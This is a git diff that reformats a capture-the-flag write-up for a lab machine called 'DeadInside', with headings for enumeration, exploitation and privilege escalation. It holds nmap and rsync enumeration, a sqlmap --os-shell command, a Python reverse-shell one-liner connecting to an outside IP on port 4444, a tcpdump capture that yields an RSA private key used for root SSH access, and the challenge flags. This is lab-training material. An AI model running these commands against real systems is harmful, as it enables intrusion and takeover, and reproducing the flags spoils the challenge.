@@ -1,4 +1,6 @@
-DeadInside
+# DeadInside
+
+## Enumeration
 
 └─$ nmap -A -p- -sC -T4 10.10.250.34 -oX nmap.out
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 11:10 BST
@@ -17,6 +19,10 @@ PORT    STATE SERVICE VERSION
 873/tcp open  rsync   (protocol version 31)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
+## Exploitation
+
+### I download all the files that I found
+
 └─$ rsync -av --list-only rsync://10.10.250.34:873/
 Conf All Confs
 
@@ -26,24 +32,33 @@ access.conf
 
 └─$ rsync -av --list-only rsync://10.10.250.34:873/Conf/access.conf access.conf
 cat access.conf 
+
+### I've changed the contents of the webapp.ini file because on the website it says something like "keep the door closed" and in the file a door field is here with writing closed.
+
 webapp.ini
 
 door = opened
 
-sqlmap -u http://10.10.250.34/door/config.php --level 5 --risk 3 --batch -D db --os-shell --forms
+### Exploit the sql database to got a shell as rick
 
+sqlmap -u http://10.10.250.34/door/config.php --level 5 --risk 3 --batch -D db --os-shell --forms
+```bash
 > python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.37.214",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+### upload pentestMonkey in the box, reverseshell to get a shell as rick
 
-upload pentestMonkey in the box, reverseshell to get shell as rick
+## User FLAG
 
-cat /home/rick/user.txt : EPI{W3_r_73h_w4lk1n9_D34D}
+```cat /home/rick/user.txt``` : EPI{W3_r_73h_w4lk1n9_D34D}
 
-linpeas = tcpdump
+## Privilege Escalation
+
+### linpeas = tcpdump
 
 tcpdump -i lo -w file.cap
-
+```bash
 cat file.cap :
 
 -----BEGIN RSA PRIVATE KEY-----
@@ -77,7 +92,11 @@ gOFPkMMr6+LJjvzfFZqaGwHFuT0W44THPSRNfuWaoTqnF/7KhrWy
 chmod 600 id_rsa
 ssh -i id_rsa root@<IP>
 
-source : https://related.cupprs.com/metamorphosis/
-
 cd /root
-at root.txt : EPI{9R0w1N9_Up_12_93771n9_u53D_70_73H_W0rld}
+```
+## Root FLAG
+
+```cat root.txt``` : EPI{9R0w1N9_Up_12_93771n9_u53D_70_73H_W0rld}
+
+### Write up to help me for the box
+source : https://related.cupprs.com/metamorphosis/
